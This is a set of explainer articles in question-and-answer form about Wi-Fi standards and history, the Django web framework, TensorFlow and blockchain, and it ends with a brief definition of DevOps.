Wi - Fi Adapters - Adapters permit various devices to connect with cable - less media to use various types of external or internal interconnects such as PC cards , USB , PCI etc .
Wi - Fi Bar Code Scanner - WiFi bar code scanner continues their workflow in retail and is intended to read stock keeping units by providing efficiency and simplicity .
Could you explain the infrastructure and ad hoc modes of operation ?
Illustrating infrastructure mode and ad hoc mode .
Source : Strand 2004 .
Infrastructure mode is suitable for any permanent network that 's intended to cover a wide area .
Ad hoc mode is suitable for a temporary network where the devices are close to each other .
In infrastructure mode , Wi - Fi devices on this network communicate through a single access point , which is generally called a wireless router .
For example , two laptops placed next to each other might connect to the same AP .
They do n't communicate directly .
Instead , they ’re communicating indirectly through the wireless access point .
Infrastructure mode requires a central access point that all devices connect to .
Ad - hoc mode is also known as peer - to - peer mode .
Ad - hoc networks do n’t require a centralized access point .
Instead , devices on the wireless network connect directly to each other .
Is Wi - Fi a viable technology for IoT applications ?
WiFi HaLow for IoT applications .
Source : Wi - Fi Alliance 2020b .
For IoT , wireless technologies commonly proposed include RFID , LoRa , Sigfox , NB - IoT , LTE - M , IEEE 802.15.4 , BLE and Bluetooth Mesh .
Wi - Fi is not suitable for battery - operated devices due to its higher power consumption .
Where a power outlet is available , Wi - Fi can be used in smart homes , home appliances , digital signages , and security cameras .
Wi - Fi 6 might cater to connected cars and retail IoT. The high data rates and low latency offered by Wi - Fi 5 and 6 make them suitable for vehicular services and applications heavy on media , such as security cameras .
For low - power long - range applications , IEEE 802.11ah , aka Wi - Fi HaLow , is the most suitable standard .
It operates in the sub-1 GHz band with a range of 1 km .
It supports short bursty data transmission and scheduled sleep / wakeup .
It 's ideal for smart building applications ( lighting , HVAC ) and smart city applications ( parking meters or garages ) .
IEEE 802.11p is for vehicular applications .
It aligns with the FCC 's Dedicated Short - Range Communications ( DSRC ) .
Applications seek to improve road safety and traffic management .
It competes with LTE - V2V. Could you share a list of top WLAN solution providers ?
A selection of top WLAN solution providers .
Source : Enterprise Networking 2016 .
In 2019 , some well - known WLAN solution providers include Aerohive Networks , Mojo Networks , Aruba Networks , Cisco Meraki , Ruckus Wireless , Datto Networking , Ubiquiti Networks , Mist Systems , Purple , Edgecore Networks , Cloud4Wi , and Eleven .
The best of them provide cloud management , including the use of ML / AI .
A report from IDC showed that in Q1 - 2019 , about 47 % of the enterprise market was with Cisco .
This is followed by Aruba , Ubiquiti and Ruckus .
NCR Corporation creates WaveLAN as a wireless alternative to Ethernet and Token Ring computer networking .
In 1991 , AT&T acquired NCR .
The same year , WaveLAN became the starting point for the standardization of Wi - Fi .
Method of transmission detailed in US patent US5487069A. Source : O'Sullivan et al .
1996 .
Australian agency CSIRO 's WLAN and its method of recovering data in multipath environments have been granted a US patent .
It was only in 1999 that the patent went into the standard IEEE 802.11a .
The technology is made available to implementers via non - exclusive licenses .
In 2005 , CSIRO filed the first worldwide family litigation .
In 2012 , it filed suits against US carriers .
The patent expires in 2013 .
IEEE published the first version of the Wi - Fi standard , called IEEE 802.11 - 1997 .
It supports 2 Mbps in the 2.4 GHz band .
IEEE published two amendments , IEEE 802.11a ( only 5 GHz band , 54 Mbps max ) and IEEE 802.11b ( only 2.4 GHz band , 11 Mbps max ) .
Although 802.11a offers 54 Mbps , 802.11b offers better range , uses the same modulation as the original standard and leads to dropping prices due to wider adoption .
However , in terms of data rates , Wi - Fi remains far slower than its wired counterparts , Fast Ethernet ( 100 Mbps , 1995 ) and Gigabit Ethernet ( 1Gbps , 1998 ) .
Some companies come together to form a global non - profit association to promote and facilitate Wi - Fi adoption and interworking , regardless of brand .
This association is initially called Wireless Ethernet Compatibility Alliance .
In 2000 , it was renamed Wi - Fi Alliance .
The Alliance also announced Wi - Fi ® as the formal name for the wireless technology .
The term Wi - Fi was in commercial use as early as August 1999 .
It was a name coined by Interbrand , who also designed the Wi - Fi logo .
The Alliance announced a certification programme and the first certified devices came out in 2000 .
IEEE publishes the IEEE 802.11 g standard that provides 54 Mbps data rate although it uses the same 2.4 GHz band as 802.11b .
Thus , 802.11 g devices can work with 802.11b devices .
It uses OFDM as the modulation just as 802.11a .
Soon , dual - band 802.11a / b products will become tri - band 802.11a / b / g .
TVs and smartphones get Wi - Fi certified and are launched on the market .
WPA2 was released to provide higher security .
For the first time , Wi - Fi is offered to passengers on a commercial flight .
The first Wi - Fi devices were used in space .
Source : Lansdowne 2020 .
NASA installs the first Wi - Fi device on the International Space Station .
Two Netgear RangeMax 802.11b / g APs are installed , each giving 240 Mbps .
In May 2016 , the Wi - Fi network will be extended to outside the space station .
In 2019 , Wi - Fi will be integrated into a space suit , take a space walk and stream HD video .
IEEE publishes the IEEE 802.11n standard .
Further amendments appear in later years : 802.11ac ( December 2013 ) and 802.11ax ( September 2019 ) .
802.11ax can be seen as an evolution of 802.11ac .
IEEE publishes the IEEE 802.11ad standard that allows operation in the 60 GHz band .
It 's derived from a WiGig specification completed by Wireless Gigabit Alliance in 2009 .
Since 2010 , this alliance has been cooperating with Wi - Fi Alliance to promote WiGig .
However , it was only in 2016 that the Wi - Fi Alliance started certifying WiGig products .
The delay is mainly because vendors are reluctant to adopt a technology that has little infrastructure support .
A sample of UI visuals showing generation names .
Source : Wi - Fi Alliance 2018b , pp .
5 .
In an effort to simplify naming , Wi - Fi Alliance introduces consumer - friendly generation names .
For example , 802.11ax is also known as Wi - Fi 6 ; 802.11ac as Wi - Fi 5 ; and 802.11n as Wi - Fi 4 .
In addition , UI visuals are defined to indicate which Wi - Fi standard is currently in use .
Meanwhile , in 2018 , Wi - Fi certifications reached 45,000 and WPA3 was released for higher security .
The 30 billionth Wi - Fi device is being shipped .
Wi - Fi adoption is accelerating given that the 10 billionth device was shipped in 2014 and the 20 billionth device was shipped only in 2017 .
Django Logo .
Source : Makai 2017a .
Django is a free open source web framework written in Python .
Like any web framework , it simplifies the development of web applications .
Its tagline refers to Django as " the web framework for perfectionists with deadlines " .
Django Software Foundation , which is a non - profit organization , maintains Django .
The following claims are made about Django : ridiculously fast , fully loaded , reassuringly secure , exceedingly scalable and incredibly versatile .
Django 's default installation can be extended with third - party packages , such as from Django Packages .
While meant primarily for fullstack web apps ( often database driven ) , Django can be used to provide backendservices for mobile apps via REST API calls , to build real - time apps or even a content management system .
What does it mean to say that Django is " fully loaded " ?
Django 's default installation comes with capabilities common to typical web applications .
This includes user authentication , content administration , database ORM , database schema migrations , URL routing , RSS feeds , a templating engine , forms , a caching framework , CSRF protection , and many more .
Variously called as " fully loaded " , " full stack " , " out of the box " or " batteries included " , they all mean the same thing : default installation contains lots of features that we need to download and install individually .
This does not imply that developers are restricted to using only Django ships .
Django is flexible enough to allow developers to use their preferred alternatives .
For example , developers can use their own templating engine or ORM .
What are the advantages of Django ?
Advantages include the following : Django is based on Python , which is a popular language that 's easy to learn and powerful .
Python works on any platform and is also open source .
Django 's official documentation is comprehensive and includes easy to follow tutorials .
Django has an active community that contributes via open packages , tutorials , books and code snippets .
Because Django takes the " batteries included " approach , downloading it and getting started is quick and easy .
With Django 's built - in admin interface , it 's easy to organize model fields or process data .
Django adapts the well - known MVC architecture and therefore , code can be written with clean abstractions .
The Django community makes regular stable releases , some of which are Long Term Support ( LTS ) releases that get three years of support .
What 's the architecture used by Django ?
MTV Architecture .
Source : http://lectures.webcourse.niksula.hut.fi / img / django_mtv.png Django uses what is called MTV Architecture : Model - Template - View .
This is equivalent to the more well - known MVC architecture : Model - View - Controller .
The traditional controller 's job is done by the framework itself and hence the MTV nomenclature does not emphasize it .
The components of MTV architecture follows : Model - Data access layer .
This deals with access , validation and relationships between data .
Models are Python classes that mediate between Django ORM and the database tables .
Template - Presentation layer .
This deals with how data is displayed to the client .
View - Business logic layer .
This is a bridge between models and templates .
A view accesses model data and redirects it to a template for presentation .
Unlike the definition of a view in traditional MVC architecture , a Django view describes what data you see , not how you see it .
It 's about processing , not presentation .
What are the different backend databases supported ?
Django officially supports PostgreSQL , MySQL , SQLite and Oracle Database Server .
In addition , third - party vendors provide support to interface their databases to Django .
These include SAP SQL Anywhere , IBM DB2 , Microsoft SQL Server , Firebird and ODBC .
A branch of Django development called Django - nonrel is already supports a couple of non - relational databases , MongoDB and Google App Engine .
However , support for many more NoSQL is listed on the NoSqlSupport Wiki page .
All these databases need to provide a driver in Python .
Psycopg is a popular one for PostgreSQL .
MySQLdb is a driver for MySQL , but it does not support Python 3 .
Its equivalent driver for Python 3 is mysqlclient .
All these drivers conform to the Python DB API .
PostgreSQL is preferred by the Django community .
A Django app can connect to multiple databases .
What are some popular large - scale websites using Django ?
Django has been used on the following sites : Disqus , Bitbucket , Instagram , Mozilla Firefox , Pinterest , NASA , The Washington Post and Eventbrite .
Pinterest later migrated to Flask due to their need for database sharding .
DjangoSites is a site that tracks websites that are built using Django .
As of October 2017 , more than 5000 sites have been listed .
How does Django compare against other web frameworks ?
Django 's popularity compared with other frameworks .
Source : HotFrameworks 2017 .
As of July 2017 , Django was the sixth most popular web framework .
When considering only Python - based frameworks , it was in the top position .
When looking at stars and forks on GitHub , Django , Flask and Tornado come up on top .
Among the Python - based frameworks are the following : Non - full - stack - Flask , Bottle , CherryPy , Pyramid Full - stack - Django , Tornado , TurboGears , web2py It 's been said that Flask is a microframework suited for small apps with simple requirements .
For larger apps , Pyramid or Django may be more suitable .
Pyramid allows developers to put together the right tools for their app and hence offers more flexibility than the " batteries included " approach of Django .
For example , Django ORM comes out of the box , but Flask and Pyramid let developers choose any ORM of their choice .
With Tornado , developers can do asynchronous programming .
Is Django recommended for a Python beginner ?
Flask is probably the easiest to learn for beginners .
Django has some learning curves , but this effort will be worthwhile in the long run when building complex apps .
Developers have commented that Web.py and Bottle are suitable for beginners .
It 's important to know Python well before starting on any web framework .
For example , it 's been mentioned that trying to learn Python via Django is not the right approach .
Can you share some performance results of Django ?
Performance in terms of requests per second .
Source : Kornatskyy 2012 .
The performance of Django in terms of throughput is seen to be above average , while Bottle and Pyramid appear to lead the pack .
We should keep in mind that performance metrics are many ( speed , memory consumption , etc .
) and may involve tradeoffs .
A direct comparison between Django and Ruby on Rails done in January 2017 shows that , on average , Python is slower than Ruby by 0.7 % .
Benchmark tests on three different hardware show that CPPSP and Go are highly performant .
Django does poorly in these tests .
It 's been claimed that Django sites have handled peak traffic of 50 K hits per second .
Discus has used an HTTP caching layer called Varnish to scale to 45 K hits per second .
They make the point that the bottleneck in their app is due to slow database queries or network latency rather than the web framework .
Can Django be used for mobile apps , REST APIs or microservices ?
Django can not be used for developing native mobile apps .
However , backendservicesforamobileapps can be developed with Django .
The Django REST framework can be used to build RESTful APIs for both web and mobile ( native or hybrid ) apps .
Is Django suited for real - time services and asynchronous apps ?
There are frameworks such as Meteor ( Node.js ) and Derby ( JavaScript ) that have been designed for real - time services and event - driven models .
Within the world of Python , there are frameworks that support the real - time needs of modern apps .
Django was not designed for real time .
However , with suitable add - on packages such as Django Channels , it can be used for real - time apps .
A curated list of Python asynchronous frameworks and libraries is also being maintained on GitHub .
These include Tornado , Gevent , asyncio and Twisted .
Celery addresses real - time requirements and has provision to integrate with Django .
What is the best way to test a Django - based web app ?
Django relies on the ` unittest ` module of Python for testing , but developers can choose to use other testing frameworks of their choice .
Django offers a test client that allows us to programmatically send requests and validate responses .
It 's recommended that testing should involve a combination of Django test clients and " in - browser " testing frameworks such as Selenium .
What is WSGI in the context of deploying a Django web app ?
WSGI stands for Web Server Gateway Interface and is standardized as PEP 3333 .
It sits as a high - level interface between Python - based web applications and web servers .
This improves the portability of apps across different web servers that support WSGI .
Because of WSGI , a particular choice of a Python web framework need not limit the deployment to only servers that support that framework .
The Django development environment comes with a lightweight server , but for production , such a server is not suitable .
Django is a web framework that needs a separate web server .
This is unlike some frameworks such as CherryPy that have a built - in WSGI server .
The Django 's documentation describes the steps to deploy the same app across different web servers : Apache with mod_wsgi , Gunicorn or uWSGI .
When deploying to the cloud , cloud providers usually share the deployment steps .
For example , Nginx could be the front web server that interfaces with uWSGI application server , which in turn invokes the Django application .
Web programmers Adrian Holovaty and Simon Willison began using Python to build web apps for Lawrence Journal - World newspaper .
Django has its roots here .
This also implies that Django was from the outset focused on solving real - world problems .
Django is released to the public .
The framework is named Django after jazz guitarist Django Reinhardt .
The first Django app was launched in The Washington Post .
Django 1.3 starts to support class - based views .
Support for Python 3 has been added .
Django 1.11 has been released .
It 's the final major release to have support for Python 2 .
This will be supported till April 2020 .
Django 2.0 has been released with only Python 3.4 + support .
TensorFlow logo .
Source : TensorFlow GitHub 2018 .
TensorFlow is an open source software library for numerical computation using data flow graphs .
Nodes in the graph represent mathematical operations , while the graph edges represent the multidimensional data arrays ( tensors ) that flow between them .
This dataflow paradigm enables parallelism , distributed execution , optimal compilation and portability .
The typical use of TensorFlow is for Machine Learning ( ML ) , particularly Deep Learning ( DL ) that uses large - scale multi - layered neural networks .
More specifically , it 's best for classification , perception , understanding , discovery , prediction and creation .
TensorFlow was originally developed by researchers and engineers working on the Google Brain team within Google 's Machine Intelligence Research organization for ML / DL research .
The system is general enough to be applicable in a wide variety of other domains as well .
For which use cases is TensorFlow best suited ?
TensorFlow can be used in any domain where ML / DL can be employed .
It can also be used in other forms of AI , including reinforcement learning and logistic regression .
On mobile devices , applications include speech recognition , image recognition , object localization , gesture recognition , optical character recognition , translation , text classification , voice synthesis , and more .
Some of the areas are : Voice / Speech Recognition : For voice - based interfaces as popularized by Apple Siri , Amazon Alexa or Microsoft Cortana .
For sentiment analysis in CRM .
For flaw detection ( noise analysis ) in industrial systems .
Text - Based Applications : For sentimental analysis ( CRM , Social Media ) , threat detection ( Social Media , Government ) and fraud detection ( Insurance , Finance ) .
For machine translation , such as with Google Translate .
For text summarization using sequence - to - sequence learning .
For language detection .
For automated email replies such as with Google SmartReply .
Image Recognition : For face recognition , image search , machine vision and photo clustering .
For object classification and identification within larger images .
For cancer detection in medical applications .
Time - Series Analysis : For forecasting .
For customer recommendations .
For risk detection , predictive analytics and resource planning .
Video Detection : For motion detection in gaming and security systems .
For large - scale video understanding .
Could you name some applications where TensorFlow is being used ?
A TensorFlow introduction that mentions real - world use cases .
Source : Google Developers YouTube 2017 .
TensorFlow is being used by Google in the following areas : RankBrain : Google search engine .
SmartReply : Deep LSTM model to automatically generate email responses .
Massively Multitask Networks for Drug Discovery : A deep neural network model for identifying promising drug candidates .
On - Device Computer Vision for OCR - On - device computer vision model to do optical character recognition to enable real - time translation .
Retinal imaging - Early detection of diabetic retinopathy using a deep neural network of 26 layers .
SyntaxNet - Built for Natural Language Understanding ( NLU ) , is based on TensorFlow and open sourced by Google in 2016 .
Outside Google , we mention some known real - world examples .
Mozilla uses TensorFlow for speech recognition .
UK supermarket Ocado uses it for route planning for its robots , demand forecasting , and product recommendations .
A Japanese farmer has used it to classify cucumbers based on shape , length and level of distortion .
As an experiment , Intel used TensorFlow on traffic videos for pedestrian detection .
Further examples were noted at the TensorFlow Developer Summit , 2018 .
Which platforms and languages support TensorFlow ?
TensorFlow is available on 64-bit Linux , macOS , Windows and also on the mobile computing platforms like Android and iOS .
Google has announced a software stack specifically for Android development called TensorFlow Lite .
TensorFlow has official APIs available in the following languages : Python , JavaScript , C++ , Java , Go , Swift .
The Python API is recommended .
Bindings in other languages are available from the community : C # , Haskell , Julia , Ruby , Rust , Scala .
There 's also a C++ API reference for TensorFlow Serving .
R 's ` tensorflow ` package provides access to the complete TensorFlow API from within R. Nvidia 's TensorRT , a Programmable Inference Accelerator , allows you to optimize your models for inference by lowering precision and thereby reducing latency .
How is TensorFlow different from other ML / DL platforms ?
GitHub stars of some ML frameworks show TensorFlow 's rising popularity .
Source : Maciej 2016 .
TensorFlow is relatively painless to setup .
With its growing community adoption , it offers a healthy ecosystem of updates , tutorials and example code .
It can run on a variety of hardware .
It 's cross platform .
It has APIs or bindings in many popular programming languages .
It supports GPU acceleration .
Through the TensorBoard , you get an intuitive view of your consumption pipeline .
Keras , a DL library , can run on TensorFlow .
However , it 's been criticized for being more complex and slower than alternative frameworks .
Created in 2007 , Theano is one of the first DL frameworks but it 's been perceived as too low - level .
Support for Theano is also ending .
Written in Lua , Torch is meant for GPUs .
The Python port released by Facebook , called PyTorch , is popular for analyzing unstructured data .
It 's developer friendly and memory - efficient .
Caffe2 does well for modeling convolutional neural networks .
Apache MXNet , along with its simplified DL interface called Gluon , is supported by Amazon and Microsoft .
Microsoft also has Microsoft Cognitive Toolkit ( CNTK ) that can handle large datasets .
For Java and Scala programmers , there 's Deeplearning4j .
Which are the tools closely related to TensorFlow ?
TensorFlow pipeline and key components .
Source : Synced 2019 .
The following are closely associated with or variants of TensorFlow : TensorFlow Lite : Enables low - latency inferences on mobile and embedded devices .
TensorFlow Mobile : To use TensorFlow from within iOS or Android mobile apps , where TensorFlow Lite can not be used .
TensorFlow Serving : A high - performance , open - source serving system for machine learning models , designed for production environments and optimized for TensorFlow .
TensorLayer : Provides popular DL and RL modules that can be easily customized and assembled for tackling real - world machine learning problems .
TensorFlow Hub : A library for the publication , discovery , and consumption of reusable parts of machine learning models .
TensorFlow Model Analysis : A library for evaluating TensorFlow models .
TensorFlow Debugger : Allows us to view the internal structure and status of running TensorFlow graphs during training and inference .
TensorFlow Playground : A browser - based interface for beginners to tinker with neural networks .
Written in TypeScript and D3.js .
It does n't actually use TensorFlow .
TensorFlow.js : Build and train models entirely in the browser or Node.js runtime .
TensorBoard : A suite of visualization tools that helps to understand , debug , and optimize TensorFlow programs .
TensorFlow Transform : A library for preprocessing data with TensorFlow .
What 's the architecture of TensorFlow ?
The architecture of TensorFlow .
Source : TensorFlow Team 2017b .
TensorFlow can be deployed across platforms , details of which are abstracted away from higher layers .
The core itself is implemented in C++ and exposes its features via APIs in many languages , with Python being the most recommended .
Above these language APIs , is the Layers API that offers commonly used layers in deep learning models .
To read data , Datasets API is the recommended way and it creates input pipelines .
With Estimators , we can create custom models or bring in models pre - made for common ML tasks .
XLA ( Accelerated Linear Algebra ) is a domain - specific compiler for linear algebra that optimizes TensorFlow computations .
If offers improvements in speed , memory usage , and portability on server and mobile platforms .
Could you explain how TensorFlow 's data graph works ?
A simple TensorFlow graph .
Source : Khan 2018 .
TensorFlow uses a dataflow graph , which is a common programming model for parallel computing .
Graph nodes represent operations and edges represent data consumed or produced by the nodes .
Edges are called tensors that carry data .
In the example figure , we show five graph nodes : ` a ` and ` b ` are placeholders to accept inputs ; ` c ` , ` d ` and ` e ` are simple arithmetic operations .
In TensorFlow 1.x , when a graph is created , tensors do n't contain the results of operations .
The graph is evaluated through sessions , which encapsulate the TensorFlow runtime .
However , with eager execution , operations are evaluated immediately instead of building a graph for later execution .
This is useful for debugging and iterating quickly on small models or data .
For ingesting data into the graph , placeholders can be used for the simplest cases , but otherwise , datasets should be preferred .
To train models , layers are used to modify values in the graph .
To simplify usage , high - level API called estimators should be used .
They encapsulate training , evaluation , prediction and export for serving .
Estimators themselves are built on layers and build the graph for you .
How is TensorFlow 2.0 different from TensorFlow 1.x ?
Comparing TF1.x versus TF2.0 .
Source : Lazy Programmer 2019 .
It makes sense to write any new code in TensorFlow 2.0 .
The Existing 1.x code can be migrated to 2.0 .
The recommended path is to move to TensorFlow 1.14 and then to 2.0 .
The compatibility module ` tf.compat ` should help .
Here are the key changes in TensorFlow 2.0 : API Cleanup : Many APIs are removed or moved .
For example , the ` absl - py ` package replaces ` tf.app ` , ` tf.flags ` , and ` tf.logging ` .
Main namespace ` tf .
* ` is cleaned up by moving some items into subpackages such as ` tf.math ` .
Examples of new modules are ` tf.summary ` , ` tf.keras.metrics ` , and ` tf.keras.optimizers ` .
Eager Execution : Like Python , eager execution is the default behaviour .
Code execute in order , making ` tf.control_dependencies ( ) ` redundant .
No More Globals : We need to keep track of variables .
Untracked ` tf .
Variable ` will get garbage collected .
Functions , Not Sessions : Functions are more familiar to developers .
Although ` session.run ( ) ` is gone , for efficiency and JIT compilation , ` tf.function ( ) ` decorator can be used .
This automatically invokes AutoGraph to convert Python constructs into TensorFlow graph equivalents .
Functions can be shared and reused .
A five - layer deep neural network partitioned across four machines in DisBelief .
Source : Dean et al .
2012 , fig .
1 .
Google Brain invents DistBelief , a framework to train large models for machine learning .
DistBelief can make use of computing clusters of thousands of machines for accelerated training .
The framework manages details of parallelism ( multithreading , message passing ) , synchronization and communication .
Compared to MapReduce , DistBelief is better at deep network training .
Compared to GraphLab , DistBelief is better at structured graphs .
Under Apache 2.0 licensing , Google open sources TensorFlow , which is Google Brain 's second - generation machine learning system .
While other open - source ML frameworks exist ( Caffe , Theano , Torch ) , Google 's competence in ML is supposedly 5 - 7 years ahead of the rest .
However , Google does n't use open source algorithms that run on TensorFlow , not its advanced hardware infrastructure .
Version 0.8 of TensorFlow has been released .
It comes with distributed training support .
Powered by gRPC , models can be trained on hundreds of machines in parallel .
For example , the Inception image classification network was trained using 100 GPUs with an overall speedup of 56x compared to a single GPU .
More generally , the system can map the dataflow graph onto heterogeneous devices ( multi - core CPUs , general - purpose GPUs , mobile processors ) in the available processes .
Google announced that it 's been using a Tensor Processing Unit ( TPU ) , a custom ASIC built specifically for machine learning and tailored for TensorFlow .
TensorFlow v0.9 has been released with support for iOS and Raspberry Pi .
Android support has been around from the beginning .
Version 1.0 of TensorFlow has been released .
The API is in Python , but there are also experimental APIs in Java and Go .
Google releases a preview of TensorFlow Lite for mobile and embedded devices .
This enables low - latency inferences for on - device ML models .
In future , this should be preferred over TensorFlow Mobile .
With TensorFlow 1.4 , we can build models using the high - level Keras API .
Keras , which was previously in ` tf.contrib.keras ` , is now the core package of ` tf.keras ` .
TensorFlow 2.0 was released following an alpha release in June .
It improves workflows for both production and experimentation .
It promises better performance on GPU acceleration .
An overview of the Blockchain .
Source : Rosic 2016 .
The Blockchain is an open , immutable distributed ledger without centralized control .
The ledger is maintained and validated by a peer - to - peer network of computers .
Such a ledger could contain any digital asset of value such as cryptocurrencies , land records , birth certificates , insurance claims , concert tickets , the source of diamonds , etc .
Because digital assets can easily be copied , we need a system that prevents fraud .
Traditionally , banks , government bodies and private institutions serve as trusted intermediaries .
Blockchain aims to bypass them .
It does this using cryptography .
No one can tamper transactions recorded in the blockchain due to high computation costs .
We may therefore say that trust is established implicitly via cryptography .
The Blockchain was initially used to create and transact a cryptocurrency called Bitcoin .
Today , it 's anticipated that blockchain can be used for diverse applications and it 's set to revolutionize multiple industries .
Why was the blockchain invented ?
The collapse of Lehmann Brothers back in 2008 triggered a global financial crisis from which many economies are yet to fully recover .
Perhaps it was this that prompted Satoshi Nakamoto ( pseudonym ) to think of a method for peers to exchange currencies without involving centralized control .
Centralized institutions such as banks fulfil the role of verifying identity , building trust , executing business logic , maintaining records , validating transactions and performing audits .
This also implies that consumers are dependent on this controlled system of trust .
Nakamoto proposed introducing a digital currency called Bitcoin and a peer - to - peer method of transacting bitcoins without involving centralized control .
Within such a network , centralized authorities and middlemen are not required .
They would not be able to take risky decisions using what belongs to you .
Peers can transact with one another directly .
The blockchain was the technology that Nakamoto invented to power the creation and transaction of bitcoins , although the term " blockchain " does not appear in his influential paper .
Could you explain how the blockchain works ?
Understand the Blockchain in Two Minutes .
Source : IFTF 2016 .
In simple technical terms , transactions / items are grouped into blocks , which are then protected using cryptography .
Each block comes with a hash that protects the integrity of the block .
This hash is computed by nodes , which are computers participating in the blockchain network .
A completed block is linked to the previous block and this forms a chain of blocks ; hence , the name blockchain .
The computation of the hash depends on the contents of the current block plus the hash of a previous block .
This means that an attacker attempting to tamper with a block in the middle will have to recompute the hash values of all subsequent blocks .
This is computationally difficult in a distributed system where multiple nodes are working on genuine blocks .
Trust in this system is therefore established by the computational complexity of pulling off a successful attack .
This complexity is known to be exponential .
If an attacker attempts to create another version of the truth ( a parallel chain ) , the rules of the blockchain will allow only the genuine chain to survive .
We call the set of rules consensus mechanism .
What are the advantages of using Blockchain ?
Blockchain has the following advantages : Distributed - Since there 's no central control , the government or any other authority can not bring down the system or suddenly change the rules .
Participating nodes in the network are all peers and have equal say in keeping the blockchain operational .
Often the term " decentralized " is used , but by classical definition , nodes in a decentralized network are connected via a hierarchy whereas those in a distributed network are truly peer to peer .
The distributed nature of blockchain makes it robust .
Transparent - The ledger is public , which means that transactions are visible to everyone participating in the network .
Malicious users can not choose to hide their transactions .
Transparency brings with it accountability and verifiability .
Immutable - Once data goes into the ledger , it can not be modified .
No one can tamper it to serve their personal gains .
Thus , a blockchain presents a single version of the truth .
Data is reliable .
Democratic - Anyone can join or leave the network as they wish .
No approval is required .
Nodes are given incentives to validate transactions .
What are the common criticisms of Blockchain ?
Blockchain 's first application , Bitcoin , was used to power criminal activities on the darknet via sites such as Silk Road .
Users on the Bitcoin network were anonymous and paid for illegal goods using bitcoins .
It 's been argued that when Blockchain is applied with access control and to private data , its integrity is compromised .
Likewise , the binding of real world assets to digital equivalents requires some form of centralized authority .
While the chain is immutable , what goes into a block is determined by who controls the private ( secret ) key .
Though the Bitcoin network is distributed , in reality , nodes are assembled into cartels and a few of them could potentially control the network .
Validating transactions is compute intensive with each block taking ten minutes .
In comparison , Visa processes 45 K transactions per second and Google Ads gets 30 billion impressions per day .
A single bitcoin transaction consumes 5,000 times more energy than a credit card payment .
In terms of memory , storing the entire chain takes up 100 GB of Bitcoin , which is duplicated on every node .
It 's been claimed that transaction costs will go up , the technology is too complex and adoption will not be universal .
Can blockchains be compared with TCP / IP ?
Just as TCP / IP changed the way we communicate , Blockchain is going to change the way we exchange value .
Just as TCP / IP created the Internet as an open public network without centralized control , Blockchain is creating an open distributed ledger system that can enable all sorts of applications .
A Blockchain , like TCP / IP , is a technological enabler .
It 's the apps and solutions built on top of the blockchain that are going to add value .
What could be typical use cases of Blockchain ?
The blockchain is being regarded as a foundational technology , poised to create a huge impact on our traditional social - economic systems .
The use cases are diverse .
Depending on the extent of novelty and complexity , they can be categorized as single use , localized use , substitution , and transformation .
While many applications are already out there , Blockchain may take a couple of decades to reach its full potential .
Here are some use cases : The MUSE platform enables music streaming platforms to offer artists a way to monetize .
IBM has partnered with food giants to trace the source of contaminated foods .
In general , supply chains are going to be transformed .
The Blockchain enables new sharing services , including sharing of computed time , storage , SMS and more .
Consumers can sell excess energy to their neighbours directly rather than sell it to the utility company .
Land title registration , birth certificates , medical records and identification documents are some examples where blockchain can lower costs and prevent fraud .
In stock trading , settlements that currently take days or weeks can happen in seconds .
Middlemen are also eliminated .
Are there applications where blockchain should not be used ?
Decision tree to determine if your app requires a blockchain .
Source : Peck 2017 .
Blockchain may be overkill for many applications where a shared database may suffice .
For performance and energy efficiency , a database is better .
If your app has multiple readers but only one writer , a blockchain is not required .
Even if there are multiple writers , they all trust one another and your systems are well protected , a blockchain is not required .
Even if the writers do n't trust one another , but they do trust a third - party , a blockchain is not required .
Many have come up with decision models or flowcharts to help you decide if your app requires a blockchain or to select the right type of blockchain .
Is Blockchain standardized ?
No , Blockchain is not a standard .
There 's no standardization body or industry consortium defining it .
Blockchain is a technology that 's based on cryptography and peer - to - peer networking .
While the Blockchain as proposed by Satoshi Nakamoto can be used in its original form , anyone can also modify it to suit their application .
This implies that applications built with Blockchain will not interwork with one another .
For example , Bitcoin and Ethereum are both built with Blockchain technology , but these are two independent applications that wo n't work together .
Having said that , there are attempts to standardize the technology .
Overseen by The Linux Foundation , Hyperledger is one such effort .
R3 and Enterprise Ethereum Alliance are also standardizing it within their scope of interests .
Microsoft 's Coco is more of a framework than a standard .
Its goal is to enable Blockchain adoption in enterprises .
What exactly is a block in a blockchain ?
Contents of a block .
Source : Tech Guru 2017 .
A simple analogy is that blocks are like pages in a traditional ledger and the entire blockchain is the ledger .
A block therefore encapsulates multiple transactions .
In the case of Bitcoin , a block has 500 transactions on average and consumes 1 MB of space on average .
A block consists of a header , a Merkle summary built from transaction identifiers , and a list of transaction identifiers .
The header itself includes the hash of the previous block , version info , current timestamp and nonce .
The hash of the current block will become part of the next block 's header .
As an example , you may study Bitcoin Block # 525510 , which was generated in March 2018 .
Can you enumerate some technical foundations of Blockchain ?
Technologies powering the Blockchain .
Source : Flaxman 2017 .
The Blockchain has brought together existing technologies in an innovative manner : Computations are not partitioned and distributed to the nodes .
All nodes on the network do the same computations .
Users sign transactions with their private keys while others verify using the corresponding public keys .
These keys are generated using the well - known RSA algorithm .
The cryptographic hash computed per block is really a fixed length output based on an input of any length .
Bitcoin uses SHA-256 to create a 256-bit hash .
Given the hash , it 's impractical to determine the contents of the block .
It 's also almost impossible for different contents to result in the same hash .
Each transaction in a block has its own hash and these hashes are arranged into a Merkle tree .
Each block contains a nonce .
Most computer power at a node is expended on finding a suitable nonce such that the resulting hash on the block is valid .
In a paper titled How To Time - Stamp a Digital Document , Haber and Stornetta note two necessary properties of digital timestamps : timestamp the data ( not the medium in which it appears ) so that it 's impossible to change the data without anyone noticing it ; make it impossible to falsify the data and its timestamp .
Their solution uses cryptographic hash functions , signatures and distributed trust .
All these would later play important roles in the invention of the Blockchain .
Bayer et al .
improve the efficiency and reliability of digital timestamping .
They propose the use of Merkle trees ( invented in 1980 by R.C. Merkle ) instead of linked lists that link transactions .
Computation is reduced from \(N\ ) steps to \(log_2N\ ) steps .
Someone going by the pseudonym Satoshi Nakamoto publishes technical details of a new peer - to - peer electronic cash system , one that avoids centralized banks or intermediaries .
He calls it Bitcoin .
The term Blockchain is not used in this paper , though the idea is clear : chain blocks based on their hashes with timestamps .
Bitcoin was launched using blockchain technology .
It 's the first application of a blockchain .
As some nodes on the Bitcoin network upgrade to version 0.8 , others continue mining with version 0.7 .
An incompatibility between the versions creates a fork , which is basically an alternative chain .
Bitcoin loses value but later regains it as nodes rollback to version 0.7 .
The DevOps workflow .
Source : Pease , 2017 .
DevOps is the coming together of both development and operations teams into a coordinated workflow such that collaboration and productivity are improved to meet shared business goals .
Building on Agile and Lean , DevOps enables the business to respond to changes and meet customer needs faster .
Tools and automation are necessary enablers .
